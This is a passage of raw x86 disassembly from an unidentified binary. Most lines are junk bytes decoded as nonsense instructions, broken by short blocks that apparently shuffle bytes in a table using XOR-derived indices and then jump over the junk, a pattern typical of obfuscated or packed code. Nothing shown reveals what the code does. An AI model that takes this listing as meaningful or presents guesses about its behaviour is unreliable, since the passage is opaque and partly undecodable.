  4049f9:	jg     0x40499d
  4049fb:	pop    es
  4049fc:	jg     0x404a19
  4049fe:	inc    eax
  4049ff:	cmp    dl,ah
  404a01:	mov    al,0x80
  404a03:	data16 mov dl,0xcc
  404a06:	retf   0x6e9f
  404a09:	lds    ebx,FWORD PTR [ebx+0x5e8b2b13]
  404a0f:	sub    ecx,DWORD PTR [esi-0xc]
  404a12:	inc    ecx
  404a13:	es arpl bp,bp
  404a16:	ins    BYTE PTR es:[edi],dx
  404a17:	sub    DWORD PTR [ecx+0x8],ecx
  404a1a:	(bad)  
  404a1b:	cli    
  404a1c:	mov    al,0x42
  404a1e:	mov    ds:0x2f25615f,eax
  404a23:	in     al,0x96
  404a25:	icebp  
  404a26:	cmp    eax,0x45544afb
  404a2b:	pop    edi
  404a2c:	icebp  
  404a2d:	jmp    DWORD PTR [edi]
  404a2f:	adc    eax,0xe2f5d27
  404a34:	in     al,0xdf
  404a36:	or     DWORD PTR ds:0x43aab29d,eax
  404a3c:	adc    al,0x5
  404a3e:	xchg   ebp,eax
  404a3f:	ds jge 0x404a8e
  404a42:	imul   DWORD PTR [edi-0xdeeebe9]
  404a48:	icebp  
  404a49:	stc    
  404a4a:	sub    eax,0x66ee11e2
  404a4f:	std    
  404a50:	xchg   edx,eax
  404a51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a52:	lock mov ebx,0xcb3b201
  404a58:	data16 shr BYTE PTR [esi+0x42d9c088],cl
  404a5f:	push   esp
  404a60:	ins    BYTE PTR es:[edi],dx
  404a61:	loopne 0x404a53
  404a63:	mov    al,0x6f
  404a65:	mov    edi,0x41500c75
  404a6a:	sub    edx,DWORD PTR [ebp+ecx*8+0x9459f34]
  404a71:	(bad)  
  404a72:	jae    0x404a85
  404a74:	or     ch,0x18
  404a77:	imul   esp,DWORD PTR [ebx-0x7c89769],0x55f0913b
  404a81:	pusha  
  404a82:	adc    DWORD PTR [esi+0x360a1daf],ecx
  404a88:	(bad)  
  404a89:	out    dx,eax
  404a8a:	cmp    al,0x3c
  404a8c:	add    DWORD PTR [edx-0x2b63d7ba],esp
  404a92:	outs   dx,BYTE PTR ds:[esi]
  404a93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a94:	iret   
  404a95:	outs   dx,DWORD PTR ds:[esi]
  404a96:	dec    eax
  404a97:	add    ebx,esp
  404a99:	(bad)  
  404a9a:	inc    BYTE PTR fs:[edx+ebx*1+0x47]
  404a9f:	clc    
  404aa0:	mov    al,ds:0xd36c8dc3
  404aa5:	sbb    eax,0x32f445c7
  404aaa:	test   DWORD PTR [eax+edi*8+0x33bc45c7],ebx
  404ab1:	test   DWORD PTR [eax+edi*8+0x33e8558b],ebx
  404ab8:	rol    BYTE PTR [ebx],1
  404aba:	shr    ecx,1
  404abc:	imul   eax,DWORD PTR [ebx],0x0
  404abf:	add    BYTE PTR [ebx-0x2fcc17ab],cl
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0xca3c6a28
  404b32:	adc    dh,dl
  404b34:	jo     0x404ad8
  404b36:	and    bh,BYTE PTR [esi+0x7e]
  404b39:	pop    eax
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404ad3
  404b3e:	xchg   edx,eax
  404b3f:	out    dx,eax
  404b40:	push   esi
  404b41:	inc    ecx
  404b42:	lock jmp 0x468e:0x8aaea537
  404b4a:	(bad)  
  404b4b:	(bad)  
  404b4c:	in     al,0x91
  404b4e:	inc    edx
  404b4f:	xchg   esi,eax
  404b50:	dec    ebx
  404b51:	xchg   BYTE PTR [eax],dh
  404b53:	test   DWORD PTR [esi+0x37],ecx
  404b56:	add    cl,ch
  404b58:	mov    ecx,0xdafef8b4
  404b5d:	push   ss
  404b5e:	retf   
  404b5f:	int3   
  404b60:	pop    ebx
  404b61:	push   esi
  404b62:	loope  0x404af7
  404b64:	in     al,0x11
  404b66:	outs   dx,DWORD PTR ds:[esi]
  404b67:	addr16 adc eax,0xce5425f
  404b6d:	jne    0x404b32
  404b6f:	addr16 lahf 
  404b71:	(bad)  
  404b72:	pop    edx
  404b73:	add    BYTE PTR [esi-0x18],ah
  404b76:	sub    al,0x61
  404b78:	inc    esi
  404b79:	mov    edi,0x3ab154ef
  404b7e:	lds    ecx,FWORD PTR [edx+0x2b]
  404b81:	push   eax
  404b82:	sub    BYTE PTR [esi-0x71c6ed7e],bl
  404b88:	cmp    al,0x95
  404b8a:	dec    ecx
  404b8b:	dec    ebp
  404b8c:	sahf   
  404b8d:	push   0xffffff99
  404b8f:	stos   BYTE PTR es:[edi],al
  404b90:	pop    esp
  404b91:	das    
  404b92:	lahf   
  404b93:	xor    DWORD PTR [edx],ecx
  404b95:	stos   BYTE PTR es:[edi],al
  404b96:	or     esp,edi
  404b98:	int    0xbe
  404b9a:	outs   dx,BYTE PTR ds:[esi]
  404b9b:	out    0x31,al
  404b9d:	pop    esi
  404b9e:	mov    esi,0x44632591
  404ba3:	ins    BYTE PTR es:[edi],dx
  404ba4:	pop    es
  404ba5:	inc    ecx
  404ba6:	enter  0x63f9,0x82
  404baa:	fcmovnu st,st(1)
  404bac:	or     BYTE PTR [ebx+0x3b],bl
  404baf:	push   ss
  404bb0:	mov    ds:0x910c4481,eax
  404bb5:	outs   dx,BYTE PTR ds:[esi]
  404bb6:	xchg   ecx,eax
  404bb7:	and    esp,DWORD PTR [esi+0x4fde44]
  404bbd:	dec    ebp
  404bbe:	inc    esp
  404bbf:	sbb    eax,DWORD PTR [eax]
  404bc1:	loope  0x404b72
  404bc3:	push   esp
  404bc4:	dec    eax
  404bc5:	jge    0x404b8a
  404bc7:	add    dh,BYTE PTR [edx+0x769e879b]
  404bcd:	dec    esi
  404bce:	mov    WORD PTR fs:[edi-0x6fa5bc4d],ss
  404bd5:	iret   
  404bd6:	outs   dx,BYTE PTR ds:[esi]
  404bd7:	(bad)  
  404bdb:	les    edi,FWORD PTR [eax]
  404bdd:	mov    eax,0xc3802a87
  404be2:	stos   BYTE PTR es:[edi],al
  404be3:	push   edx
  404be4:	xchg   esi,eax
  404be5:	cld    
  404be6:	dec    edx
  404be7:	ins    BYTE PTR es:[edi],dx
  404be8:	or     eax,DWORD PTR [ecx+0x47]
  404beb:	js     0x404b8d
  404bed:	push   esi
  404bee:	fsub   QWORD PTR [edi-0x61]
  404bf1:	les    edx,FWORD PTR [edi+0xad5f5c2]
  404bf7:	ror    BYTE PTR [edi+0x5322a308],0x72
  404bfe:	aaa    
  404bff:	push   es
  404c00:	sub    eax,0xbe91a01d
  404c05:	pop    esp
  404c06:	inc    eax
  404c07:	lods   eax,DWORD PTR cs:[esi]
  404c09:	loope  0x404c65
  404c0b:	ret    
  404c0c:	mov    ds:0x925ed9c,al
  404c11:	add    cl,BYTE PTR [ecx+eiz*2-0x52]
  404c15:	mov    bh,0xdf
  404c17:	in     al,dx
  404c18:	dec    esi
  404c19:	outs   dx,DWORD PTR ds:[esi]
  404c1a:	mov    bl,0xaa
  404c1c:	icebp  
  404c1d:	xor    dh,bh
  404c1f:	jbe    0x404c07
  404c21:	mov    al,ds:0x3a0366a1
  404c26:	inc    ecx
  404c27:	rcr    BYTE PTR [ebx],1
  404c29:	xchg   edi,eax
  404c2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c2b:	add    eax,0xe1285d1
  404c30:	test   eax,0x776c8b57
  404c35:	sbb    eax,0xcac0294f
  404c3a:	push   ss
  404c3b:	jae    0x404c67
  404c3d:	mov    ds:0x86037abb,al
  404c42:	mov    ah,0x2f
  404c44:	sbb    dh,BYTE PTR [ecx-0x4c7d3262]
  404c4a:	ret    
  404c4b:	xor    dh,BYTE PTR [ecx]
  404c4d:	xchg   ebp,eax
  404c4e:	std    
  404c4f:	call   0x9cfb8cc6
  404c54:	in     eax,0xfb
  404c56:	aaa    
  404c57:	cmp    DWORD PTR [edi+ebp*2-0x33a36b8c],edi
  404c5e:	sbb    BYTE PTR [esi-0x19],cl
  404c61:	imul   edx,DWORD PTR [edx+0x1eb5f0f5],0xffffffc5
  404c68:	pop    es
  404c69:	jb     0x404c27
  404c6b:	mov    gs,WORD PTR [edx-0x209b11e6]
  404c71:	xchg   DWORD PTR [edi-0x65af628a],edx
  404c77:	dec    eax
  404c78:	out    0x82,al
  404c7a:	sub    bl,BYTE PTR [eax]
  404c7c:	xor    al,0xd2
  404c7e:	add    bl,BYTE PTR [eax]
  404c80:	push   edx
  404c81:	add    bh,ah
  404c83:	add    bl,BYTE PTR [esi+0xc962e4d]
  404c89:	xchg   edx,eax
  404c8a:	sbb    al,0x28
  404c8c:	or     al,0x5c
  404c8e:	pop    ebx
  404c8f:	(bad)  
  404c90:	xor    eax,0x84919f07
  404c95:	jl     0x404c4f
  404c97:	fdivr  QWORD PTR es:[bx+si+0x25]
  404c9c:	fsubr  QWORD PTR [ebp+ebp*8-0x5c26569a]
  404ca3:	inc    esi
  404ca4:	lds    edi,FWORD PTR [ecx-0x1bdf24ea]
  404caa:	(bad)  
  404cab:	push   0xa2f64158
  404cb0:	(bad)  
  404cb1:	and    ecx,DWORD PTR [edx-0xc]
  404cb4:	test   al,0x9f
  404cb6:	pop    es
  404cb7:	cdq    
  404cb8:	sbb    BYTE PTR [esi-0x4e],cl
  404cbb:	into   
  404cbc:	mov    esp,0xa0f3b434
  404cc1:	push   edx
  404cc2:	xor    DWORD PTR [esi+0x153611a5],0xffffff84
  404cc9:	xor    al,0xa5
  404ccb:	mov    dl,0x56
  404ccd:	enter  0x414f,0x99
  404cd1:	call   0x8535:0x1e1e9833
  404cd8:	xchg   esp,eax
  404cd9:	pushf  
  404cda:	cli    
  404cdb:	clc    
  404cdc:	mov    ds:0x314d4fb4,al
  404ce1:	mov    ch,0x6a
  404ce3:	mov    ds:0x48f1ab79,eax
  404ce8:	sar    DWORD PTR [esi-0x1dcecf7b],1
  404cee:	and    al,0x8e
  404cf0:	dec    ebx
  404cf1:	push   ebx
  404cf2:	xchg   esp,eax
  404cf3:	xchg   esi,eax
  404cf4:	cdq    
  404cf5:	in     al,dx
  404cf6:	jg     0x404d04
  404cf8:	std    
  404cf9:	test   DWORD PTR [ecx],0x46e6b6ce
  404cff:	in     al,0xf
  404d01:	mov    al,0x5e
  404d03:	fsub   QWORD PTR [ebp-0x79734577]
  404d09:	mov    ds:0x79c9ed15,eax
  404d0e:	test   BYTE PTR [ebp+0x2f869c39],ah
  404d14:	dec    edi
  404d15:	lods   eax,DWORD PTR ds:[esi]
  404d16:	repz lds edx,FWORD PTR [edx+0x6f]
  404d1a:	mov    ebp,0x1742fa66
  404d1f:	stos   DWORD PTR es:[edi],eax
  404d20:	mov    al,0x41
  404d22:	inc    edi
  404d23:	cmp    BYTE PTR ss:[ecx+0x753aa751],dh
  404d2a:	inc    edi
  404d2b:	pop    ebp
  404d2c:	xor    eax,0xb0cda55b
  404d31:	or     DWORD PTR [esi+0x62832a33],ecx
  404d37:	or     DWORD PTR [ebp+0x6d],esp
  404d3a:	mov    ds:0x366d6974,al
  404d3f:	not    BYTE PTR [edx-0x4c99a132]
  404d45:	dec    ebx
  404d46:	push   esi
  404d47:	mov    dl,0xcd
  404d49:	enter  0xf4e2,0x6f
  404d4d:	out    dx,al
  404d4e:	xchg   ebx,eax
  404d4f:	push   ds
  404d50:	repz add eax,0x74d0cf7e
  404d56:	retf   0x8782
  404d59:	loop   0x404d06
  404d5b:	fistp  WORD PTR [esi-0x30]
  404d5e:	outs   dx,BYTE PTR ds:[esi]
  404d5f:	ins    BYTE PTR es:[edi],dx
  404d60:	cli    
  404d61:	(bad)  
  404d62:	mov    ch,0x4
  404d64:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  404d66:	and    DWORD PTR [ecx+ebp*2+0x2fd05075],ebx
  404d6d:	or     cl,BYTE PTR [edx+0x20]
  404d70:	xchg   esp,eax
  404d71:	mov    ds,WORD PTR [ebx]
  404d73:	mov    esi,0xba2f7174
  404d78:	cmp    dl,al
  404d7a:	push   DWORD PTR [ebx+edx*2]
  404d7d:	mov    BYTE PTR [edi+0x5],bh
  404d80:	xor    ecx,edi
  404d82:	pop    eax
  404d83:	fcom   DWORD PTR [edx-0x20]
  404d86:	enter  0xe622,0x67
  404d8a:	into   
  404d8b:	loopne 0x404d12
  404d8d:	sub    eax,DWORD PTR [esi-0x45]
  404d90:	outs   dx,DWORD PTR ds:[esi]
  404d91:	mov    esi,0x9841e3f0
  404d96:	xor    eax,0x9f7ceca3
  404d9b:	and    al,BYTE PTR [eax+0x23557c65]
  404da1:	in     eax,dx
  404da2:	int    0xf
  404da4:	fstp   QWORD PTR [ebx+0x5a693a39]
  404daa:	popa   
  404dab:	or     BYTE PTR [ebx-0x62226f34],ch
  404db1:	cmp    eax,0x8d398da4
  404db6:	push   0xfa711f88
  404dbb:	rol    DWORD PTR [edi+0x4bf1c5d3],cl
  404dc1:	jge    0x404d57
  404dc3:	sub    bl,BYTE PTR [ebx+0x4]
  404dc6:	pop    edi
  404dc7:	(bad)  
  404dc8:	ficomp WORD PTR [esi]
  404dca:	pop    eax
  404dcb:	rol    DWORD PTR [eax+edx*4+0x8203d0b],cl
  404dd2:	bnd es jp 0x404df5
  404dd6:	push   ds
  404dd7:	xchg   edx,eax
  404dd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404dd9:	arpl   ax,sp
  404ddb:	push   0x43f81df6
  404de0:	ror    ebx,1
  404de2:	pop    eax
  404de3:	lods   eax,DWORD PTR ds:[esi]
  404de4:	and    al,ch
  404de6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404de7:	and    DWORD PTR [ebx+0x7b5d6362],edi
  404ded:	cmp    al,ch
  404def:	int3   
  404df0:	xchg   ecx,eax
  404df1:	js     0x404dbc
  404df3:	mov    edi,0x1725f586
  404df8:	xor    eax,0x77476389
  404dfd:	icebp  
  404dfe:	retf   0x6aa9
  404e01:	stos   BYTE PTR es:[edi],al
  404e02:	cmc    
  404e03:	and    eax,0x3e15fc51
  404e08:	std    
  404e09:	(bad)  
  404e0a:	outs   dx,DWORD PTR ds:[esi]
  404e0b:	sbb    ecx,DWORD PTR [esi+0xf]
  404e0e:	xor    al,0xc7
  404e10:	sub    al,0xf8
  404e12:	cmp    al,BYTE PTR [esi+0x4e]
  404e15:	sub    eax,DWORD PTR [eax+0x3e]
  404e18:	adc    DWORD PTR [ebp+0x57694aec],0x27
  404e1f:	loope  0x404dfa
  404e21:	je     0x404e60
  404e23:	add    edi,ecx
  404e25:	imul   edx,edi
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404de6
  404e5e:	push   eax
  404e5f:	fincstp 
  404e61:	mov    WORD PTR [ecx],fs
  404e63:	jle    0x404ee3
  404e65:	pop    eax
  404e66:	jl     0x404ee6
  404e68:	jle    0x404e26
  404e6a:	mov    WORD PTR [eax+0x63cea40b],gs
  404e70:	(bad)  
  404e71:	call   0xc6854b88
  404e76:	jge    0x404e8f
  404e78:	shl    DWORD PTR [ebx+0x6099ca8c],cl
  404e7e:	stc    
  404e7f:	test   BYTE PTR [ebp+0x6a2768c1],dl
  404e85:	push   ss
  404e86:	adc    eax,0x788c62b8
  404e8b:	clc    
  404e8c:	gs cmp al,0x27
  404e8f:	out    0xe,eax
  404e91:	fisubr DWORD PTR [ecx-0x370108ba]
  404e97:	mov    eax,ds:0x2b15ee6
  404e9c:	push   edx
  404e9d:	outs   dx,BYTE PTR ds:[esi]
  404e9e:	nop
  404e9f:	sti    
  404ea0:	stos   BYTE PTR es:[edi],al
  404ea1:	dec    edi
  404ea2:	pop    ebx
  404ea3:	rcl    DWORD PTR [edi-0x4f],cl
  404ea6:	repnz sti 
  404ea8:	cmp    bl,BYTE PTR [ecx-0x10b2d4f9]
  404eae:	cmp    DWORD PTR [esi],esi
  404eb0:	jno    0x404f2a
  404eb2:	and    esi,DWORD PTR es:[esi+0x58]
  404eb6:	test   al,0x6d
  404eb8:	mov    ecx,0xfbef0d19
  404ebd:	js     0x404e93
  404ebf:	or     DWORD PTR [edi+0x346bceaf],esi
  404ec5:	cmove  esp,DWORD PTR [ebp+eiz*2+0x1b]
  404eca:	outs   dx,BYTE PTR ds:[esi]
  404ecb:	popf   
  404ecc:	xor    ebx,esi
  404ece:	sub    ebx,DWORD PTR [edx]
  404ed0:	push   cs
  404ed1:	inc    al
  404ed3:	out    0x31,eax
  404ed5:	scas   al,BYTE PTR es:[edi]
  404ed6:	(bad)  
  404ed8:	in     eax,dx
  404ed9:	sbb    al,0x82
  404edb:	shl    BYTE PTR [edx],cl
  404edd:	sbb    al,0xc9
  404edf:	mov    ecx,0x45ceac59
  404ee4:	ds push 0x7110ecd5
  404eea:	ret    0x3994
  404eed:	add    edi,ebx
  404eef:	cmp    esp,DWORD PTR [ebp-0x4485ff1]
  404ef5:	cld    
  404ef6:	out    0x5,eax
  404ef8:	mov    esp,0x9967c1e9
  404efd:	and    edx,DWORD PTR [ecx+0x72f38881]
  404f03:	adc    BYTE PTR [ecx-0xd],0x8d
  404f07:	push   ds
  404f08:	and    ebp,DWORD PTR [esi+0x71c826b7]
  404f0e:	popa   
  404f0f:	jno    0x404e9c
  404f11:	outs   dx,BYTE PTR ds:[esi]
  404f12:	aad    0xac
  404f14:	pop    di
  404f16:	mov    bh,0xb3
  404f18:	icebp  
  404f19:	sub    dh,al
  404f1b:	imul   ebx,edi,0x9e1718e3
  404f21:	sbb    BYTE PTR [edi],0xd2
  404f24:	adc    esi,DWORD PTR [esi+0x41982937]
  404f2a:	gs dec esp
  404f2c:	call   0x2889:0x68ba2a66
  404f33:	scas   eax,DWORD PTR es:[edi]
  404f34:	jg     0x404f5e
  404f36:	and    DWORD PTR [eax],esi
  404f38:	cmp    BYTE PTR [esi-0x5bcc5c65],0x19
  404f3f:	sub    BYTE PTR [esi+ebx*4],bl
  404f42:	(bad)  
  404f43:	ss (bad) 
  404f45:	xchg   edx,eax
  404f46:	dec    eax
  404f47:	mov    ebx,0xf6e02830
  404f4c:	cmp    esi,0x1d
  404f4f:	xor    al,0xd9
  404f51:	push   edi
  404f52:	sbb    ch,BYTE PTR [ecx]
  404f54:	std    
  404f55:	cld    
  404f56:	(bad)  
  404f57:	lea    esp,[edx-0x2dc8931b]
  404f5d:	jmp    0x774085b6
  404f62:	inc    ecx
  404f63:	fild   QWORD PTR [eax+0x6d918b7]
  404f69:	push   cs
  404f6a:	dec    ecx
  404f6b:	aaa    
  404f6c:	sbb    eax,0xc7c333f5
  404f71:	ret    
  404f72:	lock mov es:0x3d5f71db,al
  404f79:	test   al,0xc2
  404f7b:	aaa    
  404f7c:	and    ecx,eax
  404f7e:	sub    DWORD PTR [esi],eax
  404f80:	mov    ch,0xd5
  404f82:	add    eax,0x5bc987ae
  404f87:	xor    DWORD PTR [ebx-0x3b],eax
  404f8a:	call   0x84b8:0x47f984c8
  404f91:	repz out 0x8c,eax
  404f94:	aaa    
  404f95:	push   ebp
  404f96:	or     al,0xb8
  404f98:	(bad)  
  404f99:	ins    BYTE PTR es:[edi],dx
  404f9a:	pushf  
  404f9b:	mov    ebx,0x5af67806
  404fa0:	das    
  404fa1:	les    esi,FWORD PTR es:[edx+0x35]
  404fa5:	dec    ebx
  404fa6:	iret   
  404fa7:	test   eax,0x70b9b211
  404fac:	xchg   esi,eax
  404fad:	cmp    eax,eax
  404faf:	data16 mov WORD PTR [ecx+0x1],es
  404fb3:	loope  0x404f3d
  404fb5:	pushf  
  404fb6:	lds    eax,FWORD PTR [ecx+edi*4-0x7f]
  404fba:	push   ds
  404fbb:	js     0x404fd2
  404fbd:	mov    ecx,esi
  404fbf:	mov    al,0x32
  404fc1:	push   0x655c4bbc
  404fc6:	xor    DWORD PTR [ebx-0x1f723d6a],ecx
  404fcc:	push   ss
  404fcd:	mov    ds:0x7fdcc939,eax
  404fd2:	adc    al,0xfb
  404fd4:	xchg   esi,eax
  404fd5:	xor    eax,0xcc739184
  404fda:	xchg   BYTE PTR [ecx-0x3329a22d],ch
  404fe0:	or     bh,cl
  404fe2:	(bad)  
  404fe3:	sti    
  404fe4:	in     eax,0x9a
  404fe6:	ins    DWORD PTR es:[edi],dx
  404fe7:	ja     0x404f87
  404fe9:	test   bh,cl
  404feb:	inc    esi
  404fec:	jmp    0xc028f0d7
  404ff1:	push   ds
  404ff2:	inc    edx
  404ff3:	popa   
  404ff4:	add    BYTE PTR [edx],bh
  404ff6:	sub    al,BYTE PTR [edx-0x17]
  404ff9:	sub    esp,DWORD PTR [eax+ecx*4-0x5d9494cb]
  405000:	xchg   DWORD PTR [edi+0x78],edi
  405003:	(bad)  
  405004:	dec    ecx
  405005:	pop    es
  405006:	dec    esp
  405007:	fcom   QWORD PTR [ecx]
  405009:	in     eax,0x9b
  40500b:	pop    ds
  40500c:	inc    ecx
  40500d:	jno    0x40505a
  40500f:	xchg   dl,dh
  405011:	hlt    
  405012:	popf   
  405013:	mov    WORD PTR [edi+edi*1],?
  405016:	pop    ds
  405017:	mov    eax,ds:0x817013
  40501c:	fidivr DWORD PTR [eax]
  40501e:	push   esi
  40501f:	push   eax
  405020:	test   eax,0x2a5b5d13
  405025:	out    0xd1,eax
  405027:	or     cl,cl
  405029:	ss es repz mov al,0x76
  40502e:	push   cs
  40502f:	mov    ch,0xa8
  405031:	adc    al,BYTE PTR [edi-0x25]
  405034:	int3   
  405035:	enter  0x389,0x1
  405039:	dec    ecx
  40503a:	jae    0x4050ac
  40503c:	mov    al,0x5c
  40503e:	mov    esp,0xf88dcd83
  405043:	cmc    
  405044:	xchg   edi,eax
  405045:	shl    BYTE PTR [eax+0x5c5cd375],cl
  40504b:	shl    DWORD PTR [edi],1
  40504d:	push   ds
  40504e:	rol    BYTE PTR [edi],1
  405050:	xor    al,0xaa
  405052:	or     al,0xa3
  405054:	std    
  405055:	(bad)  
  405057:	enter  0x365a,0x5b
  40505b:	xchg   edi,eax
  40505c:	inc    edi
  40505d:	cli    
  40505e:	(bad)  
  405060:	mov    ebx,DWORD PTR [ecx]
  405062:	ds xchg ebx,eax
  405064:	fsubr  st(5),st
  405066:	(bad)
  405069:	inc    edx
  40506a:	scas   al,BYTE PTR es:[edi]
  40506b:	ror    BYTE PTR [ebp-0x795b62f2],1
  405071:	mov    ebp,0xc51d35e9
  405076:	inc    edi
  405077:	(bad)  
  405079:	cs jmp 0x708b796e
  40507f:	and    bl,BYTE PTR [ecx+0x24]
  405082:	bound  eax,QWORD PTR [edx]
  405084:	mov    eax,ds:0x1af1eefb
  405089:	pop    ds
  40508a:	xor    ah,BYTE PTR [edx+0x64]
  40508d:	mov    bh,0xb0
  40508f:	push   0xffffffa6
  405091:	es loop 0x4050dd
  405094:	repnz lahf 
  405096:	mov    dh,0xe
  405098:	shr    BYTE PTR [eax-0xdf21fda],1
  40509e:	xchg   esi,eax
  40509f:	in     eax,dx
  4050a0:	dec    edx
  4050a1:	add    DWORD PTR [esi-0x6ed57087],edi
  4050a7:	fistp  QWORD PTR [ebp+0x22]
  4050aa:	out    0xeb,eax
  4050ac:	mov    eax,ds:0x7739b0c9
  4050b1:	lds    ebp,FWORD PTR [edx+0x2d]
  4050b4:	or     BYTE PTR [eax-0x26],ah
  4050b7:	not    DWORD PTR [ebx*1-0x14ebd54a]
  4050be:	push   ebp
  4050bf:	addr16 pop es
  4050c1:	into   
  4050c2:	out    dx,al
  4050c3:	loop   0x405096
  4050c5:	cmp    edx,eax
  4050c7:	jo     0x40507a
  4050c9:	fs or  eax,0x6553179
  4050cf:	jmp    0x405113
  4050d1:	pushf  
  4050d2:	mov    ecx,0xef3f1807
  4050d7:	je     0x40506b
  4050d9:	outs   dx,DWORD PTR ds:[esi]
  4050da:	cdq    
  4050db:	mov    dl,0x7e
  4050dd:	ins    BYTE PTR es:[edi],dx
  4050de:	xor    al,BYTE PTR [edx]
  4050e0:	arpl   WORD PTR [edx+esi*2+0x7b17ebbf],si
  4050e7:	inc    edx
  4050e8:	inc    edx
  4050e9:	neg    eax
  4050eb:	mov    esp,0x62118330
  4050f0:	sub    dl,BYTE PTR [eax-0x33]
  4050f3:	xor    ebx,DWORD PTR [eax+0x1e0305ff]
  4050f9:	or     DWORD PTR [ebp-0x69],0xe4a5b253
  405100:	fcomp  DWORD PTR [esi+0x1c19a926]
  405106:	(bad)  
  405107:	addr16 push eax
  405109:	pop    ebp
  40510a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40510b:	lods   eax,DWORD PTR ds:[esi]
  40510c:	xor    DWORD PTR [esi-0x1b],ebx
  40510f:	sub    dl,BYTE PTR ds:0x57f207bd
  405115:	out    0xa8,eax
  405117:	outs   dx,DWORD PTR ds:[esi]
  405118:	cld    
  405119:	je     0x40514e
  40511b:	lea    ebp,ds:0x70334183
  405121:	add    BYTE PTR [edx+0x52c7bd98],cl
  405127:	xor    ch,BYTE PTR [esi-0x35]
  40512a:	outs   dx,DWORD PTR ds:[esi]
  40512b:	pop    edx
  40512c:	adc    DWORD PTR ss:[esi],ecx
  40512f:	les    ecx,FWORD PTR [ebp+0x5]
  405132:	or     al,0x9
  405134:	mov    bh,0x1b
  405136:	loope  0x405177
  405138:	mov    cl,0x9e
  40513a:	mov    cl,0xc6
  40513c:	inc    ebp
  40513d:	pop    esp
  40513e:	clc    
  40513f:	leave  
  405140:	ficom  WORD PTR [esp+ebx*8+0x603157d3]
  405147:	fdiv   DWORD PTR [ebx]
  405149:	outs   dx,DWORD PTR ds:[esi]
  40514a:	adc    eax,0x25fb1f21
  40514f:	imul   edi,ebx
  405152:	mov    ebx,DWORD PTR [ebp-0x18]
  405155:	xor    ebx,eax
  405157:	sub    edx,ecx
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	sbb    DWORD PTR [ecx],0x2cf63f2a
  405177:	jle    0x4051f7
  405179:	pop    eax
  40517a:	jl     0x4051fa
  40517c:	jle    0x405188
  40517e:	in     al,dx
  40517f:	in     al,0xa3
  405181:	xor    ebx,0xba504d50
  405187:	clc    
  405188:	sub    ecx,DWORD PTR [edi]
  40518a:	sub    eax,0xb79fc107
  40518f:	mov    ds:0xdbcd4d1a,al
  405194:	xor    DWORD PTR [esi],eax
  405196:	jbe    0x405144
  405198:	mul    DWORD PTR [eax+0x6a]
  40519b:	fmulp  st(0),st
  40519d:	sahf   
  40519e:	inc    edi
  40519f:	jns    0x405186
  4051a1:	in     al,0x6c
  4051a3:	popf   
  4051a4:	lock pop edx
  4051a6:	js     0x405225
  4051a8:	outs   dx,DWORD PTR ds:[esi]
  4051a9:	mov    eax,0x17976a1
  4051ae:	leave  
  4051af:	test   eax,ebx
  4051b1:	xor    ebx,DWORD PTR [edi]
  4051b3:	bound  esi,QWORD PTR [esi+edx*8+0x7b64df0c]
  4051ba:	fst    DWORD PTR [eax+0x67ee9593]
  4051c0:	add    BYTE PTR [edi+edi*1-0x36],ah
  4051c4:	xchg   DWORD PTR [edx],ebx
  4051c6:	sbb    dh,dh
  4051c8:	mov    dl,bh
  4051ca:	fbstp  TBYTE PTR [ecx]
  4051cc:	retf   
  4051cd:	aaa    
  4051ce:	xor    ah,ch
  4051d0:	(bad)  
  4051d1:	dec    eax
